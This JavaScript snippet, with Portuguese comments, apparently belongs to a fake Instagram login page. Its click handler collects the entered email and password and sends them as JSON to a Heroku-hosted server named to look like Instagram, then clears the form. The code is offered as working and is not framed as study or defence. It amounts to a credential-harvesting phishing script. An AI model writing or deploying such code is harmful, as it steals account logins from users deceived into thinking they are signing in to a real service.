const submitForm = () => {
  const email = user.value;
  const passwordValue = password.value;

  // Objeto com os dados a serem enviados no corpo da requisição
  const data = {
    email: email,
    password: passwordValue
  };

  fetch('https://instagram-7a92281434df.herokuapp.com/register', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      // Se precisar de alguma autorização, adicione aqui
    },
    body: JSON.stringify(data) // Converte o objeto para JSON
  })
  .then(response => {
    if (response.ok) {
      console.log("Requisição enviada com sucesso!");
      // Faça algo após o envio bem-sucedido, se necessário
    } else {
      console.error("Erro ao enviar requisição:", response.status);
      // Faça algo para lidar com o erro, se necessário
    }
  })
  .catch(error => {
    console.error("Erro:", error);
    // Faça algo para lidar com o erro de requisição
  });
};

button.addEventListener("click", () => {
  const value = password.value;

  if (value === "" || value.length < 6) {
    button.style.backgroundColor = "#B2DFFC";
    show.style.display = "none";
  } else {
    submitForm(); // Chama a função para enviar o formulário
    button.style.backgroundColor = "#0095F6";
    show.style.display = "block";
  }

  // Limpa os campos e redefine o estilo após o envio
  password.value = "";
  user.value = "";
  button.style.backgroundColor = "#B2DFFC";
  show.style.display = "none";
});
